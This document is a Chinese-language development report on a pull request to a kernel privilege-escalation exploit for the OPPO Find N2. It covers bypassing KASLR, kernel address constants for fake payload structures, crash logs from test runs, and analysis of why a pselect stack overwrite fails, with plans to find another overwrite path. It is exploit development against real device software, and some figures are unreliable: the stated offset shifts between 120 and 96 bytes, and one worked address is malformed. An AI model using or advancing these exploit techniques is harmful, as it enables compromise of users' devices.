# PR #13 分析报告

## 概述

PR #13 "bypass slide" 由 Dere3046 (bfc6e) 提交，旨在绕过 slide pselect 机制。该 PR 移除了 slide leak 代码，直接使用 `P0_PAGE_OFFSET + P0_KERNEL_PHYS_LOAD` 作为 kernel base。

**测试结论**: PR #13 跳过了 KASLR leak，但 pselect 栈覆盖本身仍然不可行 — waiter 偏移错位 120 字节的问题没有解决。

---

## PR #13 原始修改

### 文件变更

| 文件 | 修改内容 |
|------|----------|
| `exploit/Makefile` | 移除 slide.c |
| `exploit/src/common.h` | 移除 slide 函数声明 (slide_pselect_words_per_set 等) |
| `exploit/src/main.c` | 跳过 slide leak，直接用 `kaslr_base = P0_PAGE_OFFSET + P0_KERNEL_PHYS_LOAD` |
| `exploit/targets/oppo-find_n2/target.h` | 移除 `PSELECT_WAITER_WORD_SHIFT` 和 `SLIDE_*` 定义 |

### PR #13 的 main.c 关键变更

```c
// 之前 (有 slide leak)
pin_to_core(CORE);
if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
}

// PR #13 (跳过 slide)
kaslr_base = P0_PAGE_OFFSET + P0_KERNEL_PHYS_LOAD;
kaslr_slide = 0;
```

---

## 我的修复（编译需要）

PR #13 有编译错误 — 移除了 SLIDE_* 定义但 util.c/fops.c 仍引用。需要额外修复：

| 文件 | 修复内容 | 原因 |
|------|----------|------|
| `target.h` | 添加回 `PSELECT_WAITER_WORD_SHIFT=1` | fops.c 需要 |
| `target.h` | 添加回 `SLIDE_*` 定义 | util.c 需要 |
| `util.c` | 用 `P0_DATA_ALIAS_CONST` 替换 SLIDE_* 宏 | fake payload 地址计算 |
| `fops.c` | `restore_slide_boot_id` 返回 0 | slide bypassed |

### util.c 关键变更

```c
// 之前 (使用 SLIDE_* 宏)
write_pc = SLIDE_LOGGERS_0_1;
write_left = SLIDE_RANDOM_BOOT_ID_DATA;
waiter_task = SLIDE_INIT_TASK;

// 修复后 (直接地址)
write_pc = P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + 0x027c14b8);
write_left = P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + 0x02b99b6d);
waiter_task = fake_task;
```

---

## 测试结果

### 第 1 次测试: PR #13 原始代码

**状态**: 编译失败

**错误**: SLIDE_* 定义被移除但 util.c 仍引用

### 第 2 次测试: 恢复 SLIDE_* 定义

**状态**: 编译成功，运行 crash

**输出**:
```
[*] leaked_mm=ffffff892dc14ec0 base=ffffff892dc10000 mode=0
[*] write_left=ffffff802a2c0048  ← 地址错误！
[*] pselect route setup attempt=1
    in0=0000000000000000 in3=0000000000000000  ← fake waiter 全零
    ← 设备重启
```

**问题**: `write_left=ffffff802a2c0048` 是 ASHMEM_MISC_FOPS 地址，不是 SLIDE_RANDOM_BOOT_ID_DATA。

### 第 3 次测试: 使用 P0_DATA_ALIAS_CONST

**状态**: 编译成功，运行 crash

**输出**:
```
[*] leaked_mm=ffffff8a25d38b40 base=ffffff8a25d38000 mode=0
[*] write_left=ffffff802ab99b6d  ← 地址正确
[*] pselect route setup attempt=1
    in0=0000000000000000 in3=0000000000000000  ← fake waiter 仍然全零
    ← 设备重启
```

**问题**: 地址正确，但 fake waiter 数据仍然没有放置到 waiter 位置。

---

## 根因分析

### fake payload 地址计算

```c
// 错误方式 (直接加偏移)
write_left = KIMAGE_TEXT_BASE + 0x02b99b6d;
// = 0xffffffc008000000 + 0x02b99b6d = 0xffffffc0ab99b6d

// 正确方式 (使用 P0_DATA_ALIAS_CONST)
write_left = P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + 0x02b99b6d);
// = 0xffffff8000000000 | (0x02b99b6d + 0x28000000)
// = 0xffffff802ab99b6d
```

### pselect route setup 输出分析

```
page=ffffff8a25d38000
fake_lock=ffffff8a25d384d0
fake_w0=ffffff8a25d393a0
fake_task=ffffff8a25d3a380
in0=0000000000000000      ← 全零！
in3=0000000000000000      ← 全零！
out0=0000008200000003
ex0=0000000000000000
ex1=0000000000000000
ex2=0000000000000000
ex3=0000000000000000
```

**关键观察**: `in0` 和 `in3` 全零，说明 fake waiter 数据没有被写入到 fd_set bitmaps 中。

---

## 核心问题

### slide pselect 栈覆盖仍然不可行

即使 kernel base 正确（PR #13 跳过了 slide leak），**pselect 栈覆盖本身仍然不可行**：

1. waiter 在 stack_top - 0x270 (IDA VERIFIED 2026-07-14)
2. fd_set 数据在 stack_top - 0x210
3. 偏移差 96 字节 (0x60)
4. fd_set bitmaps 从 stack_top - 0x210 向上增长，无法覆盖 waiter 位置

> [!NOTE]
> 之前记录为 stack_top - 0x288 (120 bytes)，经 IDA 重新验证为 0x270 (96 bytes)

### FRONTEND_STACK_ALLOC=256 确认

```
NFDS=320: size=40 < 42.67 → 栈缓冲区 (v35)
NFDS=321: size=48 > 42.67 → kvmalloc (堆)
```

**结论**: NFDS=320 是栈路径最大值，没有 NFDS 值能让 fd_set 覆盖 waiter 位置。

---

## Git 历史

```
f50448f fix: use P0_DATA_ALIAS_CONST for correct direct-map addresses in fake payload
8693747 fix: restore correct SLIDE_ addresses for fake payload construction
94d111f fix: remove all slide references from fops.c and util.c for PR #13
e316565 fix: add SLIDE_ defines and PSELECT_WAITER_WORD_SHIFT for PR #13 compilation
69afa14 docs: update AGENTS.md with NFDS sweep results and PR #11/#12 merges
6422b7a Merge pull request #13 from Dere3046/fix-bootid
```

---

## 下一步

1. **修复 slide pselect** — 需要重新设计机制，找到其他方法将用户可控数据放置到 waiter 位置
2. 或 **放弃 slide pselect**，寻找其他栈覆盖方法（如 sendmsg）
